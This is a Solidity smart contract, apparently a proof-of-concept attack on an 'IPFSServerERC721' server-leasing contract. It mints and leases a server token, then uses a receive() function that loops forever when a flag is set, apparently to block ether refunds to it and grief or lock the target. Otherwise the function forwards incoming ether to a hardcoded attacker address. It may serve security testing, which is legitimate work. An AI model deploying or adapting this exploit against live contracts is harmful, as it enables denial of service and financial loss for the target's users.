// SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

import "./IPFSServerERC721.sol";
import "./IERC721Receiver.sol";

contract IPFSServerERC721Attack_2 is IERC721Receiver{
    IPFSServerERC721 private _contract;
    address constant private attackerAddress = 0x7116992Da5A1152D8512163BbdF35b8237Ee1567;//todo change
    bool private blocked;

    constructor(address _ipfsServer721Address) {
        _contract = IPFSServerERC721(_ipfsServer721Address);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external
    override
    pure
    returns(bytes4) {
        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }

    // Receive is called when the contract sends Ether to the attacker contract.
    receive() external payable {
        if (blocked) {
            while (true) {}
        } else {
            (bool success,) = attackerAddress.call{value: msg.value}("");
            require(success, "failed to send ether");
        }
    }

    function attack() external payable {
        require(msg.sender == attackerAddress);
        blocked = true;
        mintServer();
        leaseServer();
    }

    function mintServer() internal {
        _contract.mintServer("uri", 1 ether);
    }

    function leaseServer() internal {
        _contract.leaseServer{value: 1 ether}(1, 0x6cc26f47a5f21a9669d57976dbdd6aa5d4159f7ca76984e44764266e3063999f);
    }
}
